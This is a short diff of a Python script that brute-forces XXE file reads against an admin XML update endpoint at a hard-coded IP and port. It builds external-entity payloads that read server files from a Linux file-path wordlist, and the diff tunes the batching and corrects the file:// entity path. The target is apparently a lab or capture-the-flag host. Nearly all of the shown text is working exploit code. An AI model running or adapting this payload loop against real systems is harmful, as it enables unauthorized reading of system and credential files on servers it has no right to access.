@@ -9,8 +9,8 @@ from tqdm import tqdm
 TARGET_URL = "http://34.100.175.35:30302/admin/events/update/1/xml"
 WORDLIST_PATH = "/usr/share/seclists/Discovery/Web-Content/LinuxFileList.txt"
 PROXY = "http://127.0.0.1:8080"
-BATCH_SIZE = 100      
-BATCH_DELAY = 30
+BATCH_SIZE = 500  
+BATCH_DELAY = 60
 TIMEOUT = 20        
 IGNORE_SIZES = [215] # Add response lengths you want to hide from console
 
@@ -40,7 +40,7 @@ def send_payload(file_path):
     
     xml_content = (
         f'<?xml version="1.0" encoding="UTF-8"?>'
-        f'<!DOCTYPE event [<!ENTITY xxe SYSTEM "file:///{full_path}">]>'
+        f'<!DOCTYPE event [<!ENTITY xxe SYSTEM "file://{full_path}">]>'
         f'<event>'
         f'<title>&xxe;</title>'
         f'<description>Super Fun Event</description>'
